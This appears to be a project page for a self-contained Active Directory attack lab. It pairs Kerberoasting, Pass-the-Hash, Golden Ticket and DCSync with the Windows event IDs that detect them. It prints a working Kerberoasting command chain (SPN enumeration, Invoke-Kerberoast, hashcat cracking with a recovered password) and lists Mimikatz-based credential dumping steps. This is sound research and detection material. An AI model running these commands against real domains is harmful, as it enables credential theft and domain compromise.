Active Directory Compromise Lab

Controlled AD Attack Simulation with Built-in Detection & Logging

Overview

A self-contained Windows Server lab environment for researching Active Directory attack techniques. Simulates real-world attack paths — Kerberoasting, Pass-the-Hash, DCSync, Golden Ticket — while simultaneously capturing and analyzing the security events generated, so you can study both the attack and its detection signature side by side.

Lab Setup

Three VMs: Domain Controller, member server, and attacker workstation. Deployed via PowerShell DSC — fully reproducible.

Attack Scenarios

Kerberoasting
  • Request TGS for service accounts
  • Extract RC4-encrypted ticket hashes
  • Offline cracking with Hashcat
  • Detection: Event ID 4769
Pass-the-Hash
  • Dump NTLM hashes with Mimikatz
  • Lateral movement via WMI / PSExec
  • No password needed
  • Detection: Event ID 4624 (Type 3)
Golden Ticket
  • Extract KRBTGT hash (DCSync)
  • Forge Kerberos TGT offline
  • Persist for years without password reset
  • Detection: Event ID 4768 anomalies
DCSync
  • Impersonate DC replication
  • Pull all password hashes from DC
  • No local access to DC required
  • Detection: Event ID 4662

Kerberoasting — Step by Step

Complete attack chain from enumeration to credential cracking.

# Step 1: Enumerate Kerberoastable accounts
PS C:\> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties *
SamAccountName: svc_sql SPN: MSSQLSvc/srv01.corp.lab:1433
# Step 2: Request TGS and export hash
PS C:\> Invoke-Kerberoast -OutputFormat Hashcat | Out-File hashes.txt
# Step 3: Crack offline
$ hashcat -m 13100 hashes.txt rockyou.txt --force
$krb5tgs$23$*svc_sql*... : Summer2023!
